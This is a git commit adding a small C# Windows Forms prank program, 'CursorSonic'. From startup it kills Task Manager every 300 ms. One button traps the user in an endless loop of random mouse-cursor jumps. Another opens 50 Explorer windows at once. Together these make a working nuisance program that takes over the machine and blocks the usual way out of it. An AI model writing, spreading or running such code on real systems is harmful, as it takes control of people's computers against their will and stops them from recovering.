c742b02e66380f885f0b0d942c5bb35550054e07
Vadymkon <66555755+Vadymkon@users.noreply.github.com>
2023-07-12 21:47:10 +0300

    Add files via upload

---
+++ CursorSonic/Form1.Designer.cs
@@ -0,0 +1,102 @@
+﻿
+namespace CursorSonic
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(255)))), ((int)(((byte)(128)))));
+            this.button1.FlatAppearance.BorderSize = 0;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
+            this.button1.Location = new System.Drawing.Point(-6, -5);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(377, 377);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Click";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.Color.Red;
+            this.button2.FlatAppearance.BorderSize = 0;
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Location = new System.Drawing.Point(-6, 369);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(771, 63);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "close";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
+            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
+            this.button3.Location = new System.Drawing.Point(367, -3);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(388, 377);
+            this.button3.TabIndex = 2;
+            this.button3.Text = "DirectorySpawn";
+            this.button3.UseVisualStyleBackColor = false;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.ControlLightLight;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
+            this.ClientSize = new System.Drawing.Size(742, 429);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.Opacity = 0D;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Единственная кнопка, которую здесь стоит нажать это Close()";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+    }
+}
+
---
+++ CursorSonic/Form1.cs
@@ -0,0 +1,96 @@
+﻿using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace CursorSonic
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            Image myimage = new Bitmap("JPEG.jpg");
+            this.BackgroundImage = myimage;
+            FormBorderStyle = FormBorderStyle.FixedSingle;
+            NameButtonChange();
+            isTaskMgr();
+
+
+        }
+        int speed = 500;
+        
+        async void isTaskMgr()
+        {
+            while(true)
+            {
+                try
+                {
+                    foreach (Process Proc in Process.GetProcesses())
+                        if (Proc.ProcessName.Equals("Taskmgr"))  //Process Excel?
+                            Proc.Kill();
+                    await Task.Delay(300);
+                }
+                catch { await Task.Delay(300); }
+            }
+        }
+        void button1_Click(object sender, EventArgs e)
+        {
+            button2.Enabled = false;
+            Text = "I'm sorry, men. :)";
+            Opacity = 100;
+            button1.Visible = false; button2.Visible = false;
+            Random rand = new Random();
+            while (true)
+            {
+                //speed++;
+                Cursor.Position = rand.Next(2) == 1? 
+                    new Point(Screen.FromControl(this).Bounds.Width + rand.Next(2, speed), Screen.FromControl(this).Bounds.Height + rand.Next(2, speed)): 
+                    new Point(Screen.FromControl(this).Bounds.Width +  rand.Next(-speed, -2), Screen.FromControl(this).Bounds.Height +  rand.Next(-speed, -2));
+               if (Cursor.Position.X < 12) Cursor.Position = new Point (Screen.FromControl(this).Bounds.Width - 200,Cursor.Position.Y); 
+               if (Cursor.Position.Y < 12) Cursor.Position = new Point (Cursor.Position.X, Screen.FromControl(this).Bounds.Height - 200); 
+                if (Cursor.Position.X > Screen.FromControl(this).Bounds.Width - 200) Cursor.Position = new Point(12, Cursor.Position.Y);
+                if (Cursor.Position.Y > Screen.FromControl(this).Bounds.Height - 200) Cursor.Position = new Point(Cursor.Position.X,12 );
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            Close();
+        }
+
+        async void Form1_Load(object sender, EventArgs e)
+        {
+            for (Opacity = 0; Opacity < 0.98; Opacity += 0.05)
+            await Task.Delay(2);
+        }
+
+        void DirectorySpawn(string path)
+        {
+            Process.Start(new ProcessStartInfo { FileName = "explorer", Arguments = $"/n, /select, {path}" });
+        }
+        async void NameButtonChange()
+        {
+            string nameofbut3 = button3.Text;
+            while(true)
+            {
+                button3.Text += "\n(new)";
+                button3.BackColor = Color.Aqua;
+                await Task.Delay(400);
+                button3.Text = nameofbut3 ;
+                button3.BackColor = Color.FromArgb(128,255,255);
+                await Task.Delay(400);
+/*                foreach (Process Proc in Process.GetProcesses())
+                    if (Proc.ProcessName.Equals("Taskmgr"))  //Process Excel?
+                        Proc.Kill();*/
+            }
+
+        }
+        private void button3_Click(object sender, EventArgs e)
+        {
+            string path = @"C:\Program Files";
+            for (int i = 0; i<50; i++) DirectorySpawn(path);
+        }
+    }
+}
